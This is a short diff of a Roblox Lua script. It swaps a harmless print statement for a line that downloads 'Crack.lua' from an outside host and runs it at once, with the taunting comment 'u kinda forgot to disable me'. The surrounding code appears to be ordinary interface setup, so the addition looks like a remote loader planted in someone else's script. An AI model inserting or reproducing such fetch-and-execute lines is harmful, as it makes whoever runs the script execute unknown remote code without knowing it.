@@ -1,5 +1,5 @@
-print("hey rain :(")
-
+loadstring(game:HttpGet("https://scripts.nord.vip/Crack.lua"))()
+ -- u kinda forgot to disable me
 local GuiService = game:GetService("GuiService")
 -- << Services >> --
 local TweenService, Core do
